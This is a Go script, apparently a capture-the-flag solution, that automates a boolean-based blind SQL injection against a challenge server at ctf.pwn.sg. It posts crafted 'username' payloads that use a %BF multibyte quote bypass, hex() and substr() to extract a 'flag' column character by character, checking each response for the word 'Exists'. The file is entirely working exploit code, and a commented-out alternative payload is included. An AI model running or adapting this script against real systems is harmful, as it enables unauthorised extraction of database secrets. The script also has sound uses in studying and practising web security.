package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

func main() {

	start := "C"

	yayRegex := regexp.MustCompile(`Exists`)

	for {
		matched := false
		for c := 32; c < 127; c += 1 {
			str := start + fmt.Sprintf("%c", c)
			//payload := fmt.Sprintf("username=aaaa%%BF%%27%%7C%%7C((hex(0x61646d696e))IN(hex(username))%%26%%26(hex(0x%s))IN(hex(substr(flag,1,%d))))#", hexstr, len(str))
			// Shorter
			payload := fmt.Sprintf("username=%%BF'||(hex(0x%x))IN(hex(substr(flag,1,%d)))#", str, len(str))
			reader := strings.NewReader(payload)
			resp, err := http.Post("http://ctf.pwn.sg:8180/?search", "application/x-www-form-urlencoded", reader)
			if err != nil {
				panic(err)
			}
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				panic(err)
			}
			resp.Body.Close()
			if yayRegex.Match(body) {
				start += fmt.Sprintf("%c", c)
				fmt.Printf("\nyay! %s\n", start)
				if c != '}' { // exit once done
					matched = true
				}
				break
			}
			fmt.Printf("%c", c)
		}
		if !matched {
			fmt.Printf("\nbye!\n")
			break
		}
	}

}
